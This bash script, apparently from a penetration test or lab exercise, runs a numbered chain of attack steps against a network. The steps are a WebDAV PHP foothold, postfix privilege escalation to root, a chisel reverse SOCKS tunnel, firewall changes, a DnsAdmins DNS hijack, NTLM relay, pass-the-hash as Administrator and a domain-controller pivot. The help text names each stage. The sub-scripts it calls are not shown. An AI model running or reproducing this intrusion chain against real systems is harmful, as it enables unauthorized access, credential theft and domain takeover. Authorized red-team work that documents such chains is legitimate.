#!/usr/bin/env bash
# Operator replay. Fill secrets.env first.
#   ./replay.sh hosts|foothold|lpe|chisel|fw|dns|relay|dcpivot
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

cmd="${1:-help}"

case "$cmd" in
  hosts)    exec bash 01-hosts.sh ;;
  foothold) exec bash 02-foothold.sh ;;
  lpe)      exec bash 03-root-postfix.sh ;;
  chisel)   exec bash 04-chisel.sh ;;
  fw)       exec bash 05-fw-445.sh ;;
  dns)
    . "$SCRIPT_DIR/00-env.sh"
    exec proxychains4 -q -f /tmp/pc.conf python3 "$SCRIPT_DIR/06-dns-hijack.py"
    ;;
  relay)    exec bash 07-ntlmrelayx.sh ;;
  pth)
    shift
    exec bash 08-pth-root.sh "${1:?NT hash}"
    ;;
  dcpivot)
    # 00-env exports DA_PASSWORD + KALI_IP
    . "$SCRIPT_DIR/00-env.sh"
    [[ -n "${DA_PASSWORD:-}" ]] || { echo "set DA_PASSWORD in secrets.env"; exit 1; }
    exec python3 09-dcpivot.py
    ;;
  help|*)
    cat <<'EOF'
usage: ./replay.sh <step>

  hosts      hosts line + TLS Date
  foothold   WebDAV PHP as grofiles
  lpe        postfix daemon_directory → root
  chisel     reverse SOCKS / SSH / SMB proxy
  fw         firewalld 445/139 on mail
  dns        DnsAdmins A-record hijack (needs chisel SOCKS)
  relay      ntlmrelayx --smb-port 9445 (leave running)
  pth HASH   PTH Administrator via SSH -L
  dcpivot    reverse SMB bridge + DA C$  (close)

EOF
    ;;
esac
